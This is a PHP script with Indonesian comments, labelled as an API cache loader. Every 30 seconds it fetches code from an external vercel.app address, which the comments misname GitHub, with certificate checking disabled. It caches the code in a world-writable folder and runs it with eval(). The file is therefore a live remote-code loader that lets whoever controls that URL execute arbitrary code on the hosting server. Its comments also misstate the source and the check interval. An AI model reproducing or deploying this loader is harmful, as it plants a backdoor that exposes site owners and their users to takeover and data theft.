<?php
// ==================== KONFIGURASI ====================
$githubRawUrl = 'https://ikhdanjoban.vercel.app/nontech/fs/topull/api.txt';
$localCacheFile = __DIR__ . '/cache/api.php';
$cacheDir = __DIR__ . '/cache';

// Buat folder cache jika belum ada
if (!is_dir($cacheDir)) {
    mkdir($cacheDir, 0777, true);
}

// ==================== FUNGSI HELPER ====================
function fetchFromGithub($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($httpCode === 200 && $response) {
        return $response;
    }
    return false;
}

function getFileHash($content) {
    return md5($content);
}

function needUpdate($content, $cacheFile) {
    if (!file_exists($cacheFile)) {
        return true;
    }
    
    $currentHash = getFileHash($content);
    $cachedContent = file_get_contents($cacheFile);
    $cachedHash = getFileHash($cachedContent);
    
    return $currentHash !== $cachedHash;
}

function shouldCheckUpdate($lastUpdateFile) {
    if (!file_exists($lastUpdateFile)) {
        return true;
    }
    
    $lastUpdate = (int)file_get_contents($lastUpdateFile);
    $timeDiff = time() - $lastUpdate;
    
    // Cek setiap 10 menit (600 detik)
    return $timeDiff >= 30;
}

// ==================== PROSES CACHE ====================
$lastUpdateFile = $cacheDir . '/api_last_update.txt';
$source = 'cache';
$apiContent = '';

// Cek apakah perlu update
if (shouldCheckUpdate($lastUpdateFile)) {
    // Ambil dari GitHub
    $githubContent = fetchFromGithub($githubRawUrl);
    
    if ($githubContent !== false) {
        // Cek apakah ada perubahan
        if (needUpdate($githubContent, $localCacheFile)) {
            // Simpan konten baru ke cache
            file_put_contents($localCacheFile, $githubContent);
            file_put_contents($lastUpdateFile, time());
            $apiContent = $githubContent;
            $source = 'github_update';
            
            // Log perubahan
            $logFile = $cacheDir . '/api_update_log.txt';
            $logEntry = date('Y-m-d H:i:s') . " - Update API dari GitHub\n";
            file_put_contents($logFile, $logEntry, FILE_APPEND);
        } else {
            // Tidak ada perubahan, gunakan cache
            if (file_exists($localCacheFile)) {
                $apiContent = file_get_contents($localCacheFile);
                $source = 'cache_no_change';
            }
            // Update timestamp terakhir check
            file_put_contents($lastUpdateFile, time());
        }
    } else {
        // Gagal ambil dari GitHub, gunakan cache
        if (file_exists($localCacheFile)) {
            $apiContent = file_get_contents($localCacheFile);
            $source = 'cache_fallback';
        }
    }
} else {
    // Belum waktunya update, gunakan cache
    if (file_exists($localCacheFile)) {
        $apiContent = file_get_contents($localCacheFile);
        $source = 'cache_timed';
    }
}

// ==================== EKSEKUSI API ====================
if (!empty($apiContent)) {
    // Eksekusi konten API dari cache
    try {
        // Hapus tag PHP pembuka jika ada di api.txt
        $apiContent = preg_replace('/^<\?php/', '', $apiContent);
        $apiContent = preg_replace('/\?>\s*$/', '', $apiContent);
        
        // Eksekusi kode API
        eval($apiContent);
    } catch (Exception $e) {
        http_response_code(500);
        echo json_encode([
            'success' => false,
            'message' => 'API Error: ' . $e->getMessage(),
            'source' => $source
        ]);
    }
} else {
    // Jika tidak ada konten, tampilkan error
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'message' => 'API content not available. Please check connection.',
        'source' => $source
    ]);
}

// ==================== DEBUGGING (OPSIONAL) ====================
if (isset($_GET['debug']) && $_GET['debug'] == 1) {
    echo "\n<!-- API Source: $source -->";
    echo "\n<!-- Last Update: " . (file_exists($lastUpdateFile) ? date('Y-m-d H:i:s', (int)file_get_contents($lastUpdateFile)) : 'Never') . " -->";
}
